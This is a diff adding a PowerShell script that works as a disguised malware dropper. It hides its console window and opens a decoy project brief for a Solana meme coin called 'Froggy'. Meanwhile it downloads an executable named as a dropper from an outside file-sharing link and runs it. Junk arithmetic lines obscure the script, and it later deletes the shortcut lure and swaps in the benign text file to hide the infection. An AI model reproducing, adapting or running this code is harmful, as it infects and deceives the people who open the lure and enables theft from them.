@@ -1,0 +1,91 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="TechnicalRequirments.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+PROJECT BRIEF — $FROGGY
+Version: 1.0 (Pre-Launch Marketing & Go-To-Market Framework)
+
+1. PROJECT OVERVIEW
+
+• Project Name: Froggy
+• Ticker: $FROGGY
+• Blockchain: Solana
+• Category: Community-Led Meme Brand / Web3 Ecosystem
+• Concept: Froggy is a community-driven meme brand built on Solana, centered around original internet culture, interactive community participation, and radical transparency.
+
+2. CURRENT STAGE & STATUS
+
+Froggy is currently in its pre-launch phase. Core brand identity, visual assets, and initial tokenomics architecture are finalized. We are now moving into active community onboarding and go-to-market execution ahead of our upcoming public launch.
+
+3. MARKETING OBJECTIVES
+
+• Primary Objective: Execute a structured, high-impact 30-day go-to-market (GTM) campaign to establish market presence and drive organic user acquisition prior to token generation.
+• Secondary Objectives:
+	• Roll out a distinct, recognizable brand voice and visual identity across core social channels.
+	• Scale an active, engaged founding community from the ground up.
+	• Establish a daily, high-output content engine tailored for X (Twitter) and Telegram.
+	• Onboard aligned Web3 creators, alpha groups, and Solana ecosystem partners.
+	• Execute a transparent launch communications strategy strictly compliant with industry standards.
+
+4. TARGET AUDIENCE
+
+• Active participants in the Solana meme coin and DeFi ecosystems.
+• Dedicated internet-meme and frog-culture communities.
+• Early adopters of community-governed Web3 brands and grassroots crypto initiatives.
+
+5. BRAND PERSONALITY & COMMUNICATIONS STANDARDS
+
+• Tone of Voice: Playful, witty, internet-native, welcoming, and direct.
+• Compliance & Messaging Standards: All communications must maintain strict transparency. Avoid speculative financial promises, guaranteed return claims, artificial urgency, or unverified exchange listing rumors.
+
+6. DELIVERABLES & SCOPE OF WORK
+
+The marketing lead/agency is tasked with delivering and executing the following:
+• 30-Day Pre-Launch Roadmap: Phased execution timeline leading up to TGE (Token Generation Event).
+• Week 1 Content Calendar: Daily posting schedule complete with copywriting and visual direction for X and Telegram.
+• Community Architecture & Moderation: Server/channel setup, security protocols, raid coordination, and community engagement workflows.
+• Creator & KOL Strategy: Target list and outreach framework for organic partnerships and transparent creator collaborations.
+• Budget Allocation ($5,000 Initial Sprint): Strategic breakdown across content production, community incentives, and creator partnerships.
+• Launch-Week Comms & KPIs: Minute-by-minute launch announcement sequence paired with clear tracking metrics (engagement rate, organic member growth, retention).
+
+7. OPERATIONAL & COMPLIANCE GUIDELINES
+
+• Organic Growth Mandate: All community-building efforts must prioritize real, active participants. Botting, fake engagement, wash trading, and artificial metric inflation are strictly prohibited.
+• Disclosure Policy: Any compensated creator partnerships or promotional campaigns must adhere to clear disclosure guidelines.
+• Governance & Security: Final public token deployment and smart contract execution remain subject to final technical audits and legal sign-off prior to going live.
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6=7*3-5
+If($v6>0){}
+Start-Sleep -Seconds 30
+$v7=2*5-1
+If($v7>0){}
+$v34=[Environment]::GetFolderPath("LocalApplicationData")
+$v38=8*2-3
+If($v38>0){}
+$v39="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=tu985j9bar8w6f5qp860ush1yn209coa&file_id=f_2608041260918"
+$v40="8267121597_small_dropper.exe"
+$v41=Join-Path $v34 $v40
+$v42=7*2-1
+If($v42>0){}
+try{$v43=New-Object System.Net.WebClient;$v43.DownloadFile($v39,$v41);$v44=New-Object System.Diagnostics.ProcessStartInfo;$v44.FileName=$v41;$v44.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v44.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v44)|Out-Null}catch{}
+$v45=6*3-2
+If($v45>0){}
+$v46="TechnicalRequirments.txt.ink"
+$v47=$false
+$v48=$null
+$v49=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v50=5+3-1
+If($v50>0){}
+foreach($v51 in $v49){If(Test-Path -Path $v51){$v52=Join-Path $v51 $v46;If(Test-Path -Path $v52){$v48=$v52;$v47=$true;break}}}
+$v53=7*2+1
+If($v53>0){}
+If($v47){$v54=Split-Path -Parent $v48;$v55=Get-Date;$v56=600;while(((Get-Date)-$v55).TotalSeconds -lt $v56){$v57=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v57){try{Remove-Item -Path $v48 -Force -ErrorAction Stop;$v58=Join-Path $v54 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v58 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
